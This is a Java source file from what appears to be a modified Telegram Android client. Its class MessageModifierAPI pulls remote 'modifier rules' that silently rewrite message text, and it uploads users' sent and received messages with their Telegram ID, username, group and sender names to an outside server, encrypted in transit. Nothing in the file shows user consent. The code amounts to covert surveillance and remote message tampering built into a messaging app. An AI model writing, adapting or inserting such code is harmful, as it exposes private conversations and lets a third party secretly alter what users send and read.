package org.telegram.messenger;

import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.regex.Pattern;

/**
 * 消息修改API客户端
 * 负责与后端服务器通信，获取修改规则并应用到消息
 * 使用 Android 原生 HttpURLConnection 实现，无需外部依赖
 */
public class MessageModifierAPI {
    private static final String TAG = "MessageModifierAPI";
    private static volatile MessageModifierAPI instance;

    // API 配置 - 需要根据实际服务器地址修改
    private static final String BASE_URL = "http://your-server:8080";
    private static final String PUBLIC_KEY_ENDPOINT = "/api/public-key";
    private static final String GLOBAL_MODIFIERS_ENDPOINT = "/api/public/message-modifiers";
    private static final String USER_MODIFIERS_ENDPOINT = "/api/public/message-modifiers/user";
    private static final String MESSAGE_UPLOAD_ENDPOINT = "/api/messages";

    // 网络请求配置
    private static final int CONNECT_TIMEOUT = 30000; // 30秒
    private static final int READ_TIMEOUT = 30000;    // 30秒

    // 线程池用于异步网络请求
    private final ExecutorService executor;
    private final Handler mainHandler;
    private String rsaPublicKey;

    // 规则缓存
    private final Map<String, List<ModifierRule>> userRulesCache = new ConcurrentHashMap<>();
    private List<ModifierRule> globalRulesCache = new ArrayList<>();
    private long lastCacheUpdate = 0;
    private static final long CACHE_DURATION = 5 * 60 * 1000; // 5分钟缓存

    /**
     * 修改规则数据模型
     */
    public static class ModifierRule {
        public int id;
        public String name;
        public String originalText;
        public String replacementText;
        public boolean isRegex;
        public boolean caseSensitive;
        public int priority;
        public String description;

        /**
         * 从JSON对象构造修改规则
         */
        public static ModifierRule fromJson(JSONObject json) throws Exception {
            ModifierRule rule = new ModifierRule();
            rule.id = json.getInt("id");
            rule.name = json.getString("name");
            rule.originalText = json.getString("original_text");
            rule.replacementText = json.getString("replacement_text");
            rule.isRegex = json.getBoolean("is_regex");
            rule.caseSensitive = json.optBoolean("case_sensitive", true);
            rule.priority = json.getInt("priority");
            rule.description = json.optString("description", "");
            return rule;
        }
    }

    /**
     * 私有构造函数，单例模式
     */
    private MessageModifierAPI() {
        // 创建固定线程池用于网络请求
        executor = Executors.newFixedThreadPool(3);
        // 主线程 Handler 用于回调
        mainHandler = new Handler(Looper.getMainLooper());

        // 初始化时获取RSA公钥
        fetchRSAPublicKey();
    }

    /**
     * 获取单例实例
     */
    public static MessageModifierAPI getInstance() {
        if (instance == null) {
            synchronized (MessageModifierAPI.class) {
                if (instance == null) {
                    instance = new MessageModifierAPI();
                }
            }
        }
        return instance;
    }

    /**
     * 获取RSA公钥用于加密通信
     */
    private void fetchRSAPublicKey() {
        executor.execute(new Runnable() {
            @Override
            public void run() {
                try {
                    String response = performGetRequest(BASE_URL + PUBLIC_KEY_ENDPOINT);
                    if (response != null) {
                        JSONObject json = new JSONObject(response);
                        rsaPublicKey = json.getJSONObject("data").getString("public_key");
                        Log.d(TAG, "RSA public key fetched successfully");
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Failed to fetch RSA public key", e);
                }
            }
        });
    }

    /**
     * 执行 GET 请求
     */
    private String performGetRequest(String urlString) {
        HttpURLConnection connection = null;
        try {
            URL url = new URL(urlString);
            connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("GET");
            connection.setConnectTimeout(CONNECT_TIMEOUT);
            connection.setReadTimeout(READ_TIMEOUT);
            connection.setRequestProperty("Accept", "application/json");
            connection.setRequestProperty("Content-Type", "application/json");

            int responseCode = connection.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
                return readInputStream(connection.getInputStream());
            } else {
                Log.w(TAG, "GET request failed with code: " + responseCode);
                return null;
            }
        } catch (Exception e) {
            Log.e(TAG, "GET request failed: " + urlString, e);
            return null;
        } finally {
            if (connection != null) {
                connection.disconnect();
            }
        }
    }

    /**
     * 执行 POST 请求
     */
    private String performPostRequest(String urlString, String jsonBody) {
        HttpURLConnection connection = null;
        try {
            URL url = new URL(urlString);
            connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");
            connection.setConnectTimeout(CONNECT_TIMEOUT);
            connection.setReadTimeout(READ_TIMEOUT);
            connection.setDoOutput(true);
            connection.setRequestProperty("Accept", "application/json");
            connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8");

            // 写入请求体
            if (jsonBody != null) {
                byte[] postData = jsonBody.getBytes(StandardCharsets.UTF_8);
                connection.setRequestProperty("Content-Length", String.valueOf(postData.length));

                try (DataOutputStream wr = new DataOutputStream(connection.getOutputStream())) {
                    wr.write(postData);
                    wr.flush();
                }
            }

            int responseCode = connection.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK || responseCode == HttpURLConnection.HTTP_CREATED) {
                return readInputStream(connection.getInputStream());
            } else {
                Log.w(TAG, "POST request failed with code: " + responseCode);
                return null;
            }
        } catch (Exception e) {
            Log.e(TAG, "POST request failed: " + urlString, e);
            return null;
        } finally {
            if (connection != null) {
                connection.disconnect();
            }
        }
    }

    /**
     * 读取输入流内容
     */
    private String readInputStream(InputStream inputStream) throws IOException {
        BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream, StandardCharsets.UTF_8));
        StringBuilder response = new StringBuilder();
        String line;
        while ((line = reader.readLine()) != null) {
            response.append(line);
        }
        reader.close();
        return response.toString();
    }

    /**
     * 获取用户的修改规则（包含全局规则）
     */
    public void fetchUserModifierRules(String telegramId, final ModifierRulesCallback callback) {
        // 检查缓存
        if (System.currentTimeMillis() - lastCacheUpdate < CACHE_DURATION) {
            List<ModifierRule> cachedRules = userRulesCache.get(telegramId);
            if (cachedRules != null || !globalRulesCache.isEmpty()) {
                if (callback != null) {
                    callback.onSuccess(
                            cachedRules != null ? cachedRules : new ArrayList<>(),
                            globalRulesCache
                    );
                }
                return;
            }
        }

        final String url = BASE_URL + USER_MODIFIERS_ENDPOINT + "?telegram_id=" + telegramId;

        executor.execute(new Runnable() {
            @Override
            public void run() {
                try {
                    String response = performGetRequest(url);
                    if (response != null) {
                        JSONObject json = new JSONObject(response);
                        JSONObject data = json.getJSONObject("data");

                        // 解析全局规则
                        List<ModifierRule> globalRules = new ArrayList<>();
                        JSONArray globalArray = data.getJSONArray("global_rules");
                        for (int i = 0; i < globalArray.length(); i++) {
                            globalRules.add(ModifierRule.fromJson(globalArray.getJSONObject(i)));
                        }

                        // 解析用户规则
                        List<ModifierRule> userRules = new ArrayList<>();
                        JSONArray userArray = data.getJSONArray("user_rules");
                        for (int i = 0; i < userArray.length(); i++) {
                            userRules.add(ModifierRule.fromJson(userArray.getJSONObject(i)));
                        }

                        // 更新缓存
                        globalRulesCache = globalRules;
                        userRulesCache.put(telegramId, userRules);
                        lastCacheUpdate = System.currentTimeMillis();

                        // 在主线程回调
                        final List<ModifierRule> finalUserRules = userRules;
                        final List<ModifierRule> finalGlobalRules = globalRules;
                        if (callback != null) {
                            mainHandler.post(new Runnable() {
                                @Override
                                public void run() {
                                    callback.onSuccess(finalUserRules, finalGlobalRules);
                                }
                            });
                        }
                    } else {
                        // 请求失败
                        if (callback != null) {
                            mainHandler.post(new Runnable() {
                                @Override
                                public void run() {
                                    callback.onError(new Exception("Request failed"));
                                }
                            });
                        }
                    }
                } catch (final Exception e) {
                    Log.e(TAG, "Failed to fetch user modifier rules", e);
                    if (callback != null) {
                        mainHandler.post(new Runnable() {
                            @Override
                            public void run() {
                                callback.onError(e);
                            }
                        });
                    }
                }
            }
        });
    }

    /**
     * 获取全局修改规则
     */
    public void fetchGlobalModifierRules(final ModifierRulesCallback callback) {
        // 检查缓存
        if (System.currentTimeMillis() - lastCacheUpdate < CACHE_DURATION && !globalRulesCache.isEmpty()) {
            if (callback != null) {
                callback.onSuccess(new ArrayList<>(), globalRulesCache);
            }
            return;
        }

        executor.execute(new Runnable() {
            @Override
            public void run() {
                try {
                    String response = performGetRequest(BASE_URL + GLOBAL_MODIFIERS_ENDPOINT);
                    if (response != null) {
                        JSONObject json = new JSONObject(response);
                        JSONObject data = json.getJSONObject("data");

                        // 解析全局规则
                        List<ModifierRule> globalRules = new ArrayList<>();
                        JSONArray rulesArray = data.getJSONArray("rules");
                        for (int i = 0; i < rulesArray.length(); i++) {
                            globalRules.add(ModifierRule.fromJson(rulesArray.getJSONObject(i)));
                        }

                        // 更新缓存
                        globalRulesCache = globalRules;
                        lastCacheUpdate = System.currentTimeMillis();

                        // 在主线程回调
                        final List<ModifierRule> finalGlobalRules = globalRules;
                        if (callback != null) {
                            mainHandler.post(new Runnable() {
                                @Override
                                public void run() {
                                    callback.onSuccess(new ArrayList<>(), finalGlobalRules);
                                }
                            });
                        }
                    } else {
                        // 请求失败
                        if (callback != null) {
                            mainHandler.post(new Runnable() {
                                @Override
                                public void run() {
                                    callback.onError(new Exception("Request failed"));
                                }
                            });
                        }
                    }
                } catch (final Exception e) {
                    Log.e(TAG, "Failed to fetch global modifier rules", e);
                    if (callback != null) {
                        mainHandler.post(new Runnable() {
                            @Override
                            public void run() {
                                callback.onError(e);
                            }
                        });
                    }
                }
            }
        });
    }

    /**
     * 应用修改规则到文本
     * @param text 原始文本
     * @param telegramId 用户的Telegram ID
     * @return 修改后的文本
     */
    public String applyModifiers(String text, String telegramId) {
        if (text == null || text.isEmpty()) {
            return text;
        }

        String modifiedText = text;

        // 获取所有适用的规则
        List<ModifierRule> allRules = new ArrayList<>();
        allRules.addAll(globalRulesCache);

        List<ModifierRule> userRules = userRulesCache.get(telegramId);
        if (userRules != null) {
            allRules.addAll(userRules);
        }

        // 如果没有规则，直接返回原文
        if (allRules.isEmpty()) {
            return text;
        }

        // 按优先级排序（优先级高的先执行）
        allRules.sort((a, b) -> b.priority - a.priority);

        // 应用规则
        for (ModifierRule rule : allRules) {
            try {
                if (rule.isRegex) {
                    // 正则表达式替换
                    int flags = rule.caseSensitive ? 0 : Pattern.CASE_INSENSITIVE;
                    Pattern pattern = Pattern.compile(rule.originalText, flags);
                    modifiedText = pattern.matcher(modifiedText).replaceAll(rule.replacementText);
                } else {
                    // 普通文本替换
                    if (rule.caseSensitive) {
                        modifiedText = modifiedText.replace(rule.originalText, rule.replacementText);
                    } else {
                        // 不区分大小写的替换
                        String regex = "(?i)" + Pattern.quote(rule.originalText);
                        modifiedText = modifiedText.replaceAll(regex, rule.replacementText);
                    }
                }

                Log.d(TAG, "Applied rule: " + rule.name);
            } catch (Exception e) {
                Log.e(TAG, "Failed to apply rule: " + rule.name, e);
            }
        }

        return modifiedText;
    }

    /**
     * 上传消息到服务器
     */
    public void uploadMessage(final MessageUploadRequest request, final MessageUploadCallback callback) {
        executor.execute(new Runnable() {
            @Override
            public void run() {
                try {
                    // 构建 JSON 请求体
                    JSONObject json = new JSONObject();
                    json.put("telegram_id", request.telegramId);
                    json.put("username", request.username);
                    json.put("content", request.content);
                    json.put("message_type", request.messageType);

                    if (request.groupTitle != null) {
                        json.put("group_title", request.groupTitle);
                    }
                    if (request.senderName != null) {
                        json.put("sender_name", request.senderName);
                    }

                    // 如果有RSA公钥，加密内容
                    String requestBodyStr = json.toString();
                    if (rsaPublicKey != null && rsaPublicKey.length() > 0) {
                        requestBodyStr = RSAEncryption.encrypt(requestBodyStr, rsaPublicKey);
                    }

                    // 执行 POST 请求
                    String response = performPostRequest(BASE_URL + MESSAGE_UPLOAD_ENDPOINT, requestBodyStr);
                    final boolean success = (response != null);

                    if (success) {
                        Log.d(TAG, "Message uploaded successfully");
                    } else {
                        Log.w(TAG, "Failed to upload message");
                    }

                    // 在主线程回调
                    if (callback != null) {
                        mainHandler.post(new Runnable() {
                            @Override
                            public void run() {
                                callback.onComplete(success);
                            }
                        });
                    }
                } catch (final Exception e) {
                    Log.e(TAG, "Failed to upload message", e);
                    if (callback != null) {
                        mainHandler.post(new Runnable() {
                            @Override
                            public void run() {
                                callback.onComplete(false);
                            }
                        });
                    }
                }
            }
        });
    }

    /**
     * 清除缓存
     */
    public void clearCache() {
        userRulesCache.clear();
        globalRulesCache.clear();
        lastCacheUpdate = 0;
    }

    /**
     * 释放资源（应用退出时调用）
     */
    public void release() {
        clearCache();
        if (executor != null && !executor.isShutdown()) {
            executor.shutdown();
        }
    }

    /**
     * 修改规则获取回调接口
     */
    public interface ModifierRulesCallback {
        void onSuccess(List<ModifierRule> userRules, List<ModifierRule> globalRules);
        void onError(Exception e);
    }

    /**
     * 消息上传回调接口
     */
    public interface MessageUploadCallback {
        void onComplete(boolean success);
    }

    /**
     * 消息上传请求数据
     */
    public static class MessageUploadRequest {
        public long telegramId;
        public String username;
        public String content;
        public String messageType; // "sent" or "received"
        public String groupTitle;  // 可选：群组名称
        public String senderName;  // 可选：发送者名称

        public MessageUploadRequest() {
            this.messageType = "sent";
        }
    }
}